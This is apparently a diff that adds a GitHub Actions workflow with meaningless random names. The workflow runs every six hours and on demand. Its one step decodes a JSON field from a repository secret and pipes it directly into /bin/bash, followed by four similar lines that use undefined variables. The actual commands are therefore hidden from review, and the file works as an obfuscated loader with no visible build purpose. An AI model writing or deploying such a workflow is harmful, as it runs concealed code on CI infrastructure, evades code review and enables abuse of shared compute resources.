@@ -1,0 +1,22 @@
+name: hehongcha4567
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hehongcha4567
+        env:
+          mxv053: ${{ secrets.mxv053 }}
+        run: |
+          echo $mxv053 | jq -r .rgy375 | /bin/bash
+          echo $uh0 | jq -r .ktnjw77 | /bin/bash
+          echo $td863 | jq -r .uh3 | /bin/bash
+          echo $txzjo38 | jq -r .or528 | /bin/bash
+          echo $k947 | jq -r .tuihd7 | /bin/bash
+
